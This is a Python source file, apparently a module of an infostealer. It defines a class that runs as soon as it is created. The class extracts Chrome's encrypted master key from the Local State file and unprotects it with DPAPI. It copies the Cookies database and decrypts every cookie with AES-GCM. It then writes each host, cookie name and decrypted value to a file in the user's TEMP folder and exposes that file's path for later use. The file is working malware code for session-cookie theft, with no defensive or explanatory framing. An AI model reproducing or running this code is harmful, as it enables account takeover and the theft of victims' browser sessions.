from .imports import *

class GCManagement:
    def __init__(self) -> None:
        self.m()
        
    def __repr__(self) -> str:
        return "GCManagement()"
        
    def gec(self):
            local_state_path = os.path.join(os.environ["USERPROFILE"],
                                            "AppData", "Local", "Google", "Chrome",
                                            "User Data", "Local State")
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)
        
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            
    def dd(self, data, key) -> str:
        try:
            iv = data[3:15]
            data = data[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:
                return ""
                
    def m(self):
        self.temp = os.getenv("TEMP")
        cookiespath = f"{self.temp}\\{os.getlogin()}-GC.txt"
        if os.path.exists(cookiespath):
            os.remove(cookiespath)
        with open(cookiespath, "a")as cookie:
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
            filename = f"{self.temp}\\Cookies.db"
            if not os.path.isfile(filename):
                shutil.copyfile(db_path, filename)
            db = sqlite3.connect(filename)
            db.text_factory = lambda b: b.decode(errors="ignore")
            cursor = db.cursor()
            cursor.execute("""
            SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
            FROM cookies""")
            key = self.gec()
            for host_key, name, value, creation_utc, last_accesses_utc, expires_utc, encrypted_value,  in cursor.fetchall():
                if not value:
                    decrypted_value = self.dd(encrypted_value, key)
                else:
                    decrypted_value = value
                cursor.execute("""
                UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
                WHERE host_key = ?
                AND name = ?""", (decrypted_value, host_key, name))
                cookie.write(f"Host: {host_key}\nCookie name: {name}\nCookie value (decrypted): {decrypted_value}\n")
            db.commit()
            db.close()
            try:
                os.remove(filename)
            except:
                pass
                
    def Val(self) -> str:
        return f"{self.temp}\\{os.getlogin()}-GC.txt"